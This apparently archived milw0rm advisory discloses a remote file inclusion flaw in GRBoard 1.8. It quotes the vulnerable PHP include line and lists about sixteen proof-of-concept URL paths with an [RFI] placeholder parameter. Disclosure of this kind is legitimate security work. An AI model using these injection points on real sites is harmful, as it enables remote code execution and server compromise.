@@ -1,0 +1,42 @@
+GRBoard 1.8 Remote File Inclusion Vulnerability
+bY make0day@gmail.com
+
+/*************************
+
+GRBoard (VERSION 1.8 )is bulletin board system of Korea.
+It is freely available for all platforms that supports PHP and MySQL.
+But I find Remote File Inclusion vulnerability.
+Here is the details:
+
+**************************/
+TEST ON VERSION GRBoard 1.8 
+Download : http://sirini.net/v22/?get=grboard
+/***************************
+Remote File Inclusion Vulnerability
+
+/form_mail.php
+
+include $grboard.'/db_info.php'; //File Include
+
+*************************/
+
+poc:
+
+/theme/179_squarebox_pds_list/view.php?theme=[RFI]
+/theme\179_squarebox_minishop_expand\view.php?theme=[RFI]
+/theme\179_squarebox_gallery_list_pds\view.php?theme=theme=[RFI]
+/theme\179_squarebox_gallery_list\view.php?theme=[RFI]
+/theme\179_squarebox_gallery\view.php?theme=[RFI]
+/theme\179_squarebox_board_swfupload\view.php?theme=[RFI]
+/theme\179_squarebox_board_expand\view.php?theme=[RFI]
+/theme\179_squarebox_board_basic_with_grcode\view.php?theme=[RFI]
+/theme\179_squarebox_board_basic\view.php?theme=[RFI]
+/theme\179_simplebar_pds_list\view.php?theme=[RFI]
+/theme\179_simplebar_notice\view.php?theme=[RFI]
+/theme\179_simplebar_gallery_list_pds\view.php?theme=[RFI]
+/theme\179_simplebar_gallery\view.php?theme=[RFI]
+/theme\179_simplebar_basic\view.php?theme=[RFI]
+/latest/sirini_gallery_latest/list.php?path=[RFI]
+/include.php?grboard=[RFI]
+
+# milw0rm.com [2009-02-04]
